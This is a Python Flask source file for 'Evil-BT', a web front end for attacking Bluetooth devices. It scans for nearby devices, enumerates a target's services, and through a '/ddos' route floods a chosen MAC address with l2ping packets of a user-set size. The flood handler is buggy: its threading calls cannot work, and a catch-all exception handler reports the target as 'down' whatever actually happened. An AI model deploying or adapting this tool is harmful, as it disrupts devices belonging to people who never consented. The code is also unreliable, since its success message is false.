from flask import Flask, render_template, request, send_from_directory, escape
from flask_socketio import SocketIO
import bluetooth
import subprocess
import threading
from colorama import *
from flask_socketio import SocketIO
import os
import time
from queue import *

os.system('clear')

app = Flask(__name__)
socketio = SocketIO(app)

print(Fore.CYAN+'''
███████╗██╗   ██╗██╗██╗      ██████╗ ████████╗
██╔════╝██║   ██║██║██║      ██╔══██╗╚══██╔══╝
█████╗  ██║   ██║██║██║█████╗██████╔╝   ██║   
██╔══╝  ╚██╗ ██╔╝██║██║╚════╝██╔══██╗   ██║   
███████╗ ╚████╔╝ ██║███████╗ ██████╔╝   ██║   
╚══════╝  ╚═══╝  ╚═╝╚══════╝ ╚═════╝    ╚═╝   
    '''+Fore.WHITE)

print('             By Caltus124\n')

@app.route('/home')
@app.route('/')
def home():
    return render_template('index.html')


@app.route('/scan')
def scan():
    return render_template('scan.html')

@app.route('/scan/result',methods=['POST', 'GET'])
def scan_result():
    try:
        nearby_devices = bluetooth.discover_devices()
        data_str2 = str(nearby_devices)[1:-1]
        data_str = data_str2.replace("'", '')
        result = "error"
        items = []
        
        if data_str == '':
            items.append("No bluetooth found !")
        else:
            
            # Pour chaque périphérique
            for addr in nearby_devices:
                # Recherche du nom du périphérique
                device_name = bluetooth.lookup_name(addr)
                result = f'{addr} - {device_name}'
                items.append(result)
                
                print(result)
        print("carte found")
        return render_template('scan.html', items=items)
    except:
        print("carte not found")
        return render_template('scan.html', items="Carte Bleutooth not activate !")   

@app.route('/scan_mac')
def scan_mac():
    return render_template('scan_mac.html')


@app.route('/scan_mac/result',methods=['POST', 'GET'])
def scan_mac_result():
    try:
        output = request.form.to_dict()

        target_url = output["target_mac"]
        services = bluetooth.find_service(address=target_url)

        return render_template('scan_mac.html', services = services)
    except:
        return render_template('scan_mac.html', services = "MAC Adresse not found !")


@app.route('/ddos')
def ddos():
    return render_template('ddos.html')



@app.route('/ddos/result',methods=['POST'])
def ddos_result():

    output = request.form.to_dict()
    packages_size = output["packet_size"]
    mac = output["target_mac"]
    threads_size = output["threads_size"]

    try:
        result = subprocess.run(['l2ping', '-i', 'hci0', '-s', packages_size, '-f', mac], stdout=subprocess.PIPE)

        threads = []
        
        for i in range(threads_size):
            t = threading.Thread(target=result, args=(mac, packages_size))
            threads.append(t)
            t.start()

        print("FIN")
    except:

        return render_template('ddos.html', newdata = mac + " is down !")





@app.route('/settings')
def settings():
    return render_template('settings.html')

@app.errorhandler(404)
def page_not_found(e):
    return render_template('404.html'), 404


@app.route('/settings/cmd_hci')
def cmd_hci():
    os.system('hciconfig hci0 up')
    result = 'Bleutooth UP !'
    return result

@app.route('/settings/cmd_hci2')
def cmd_hci2():
    os.system('hciconfig hci0 down')
    result = 'Bleutooth DOWN !'
    return result

@app.route('/settings/hciconfig')
def hciconfig_name():
    output = subprocess.check_output(['hciconfig']).decode()
    return escape(output)


if __name__ == '__main__':
    socketio.run(app)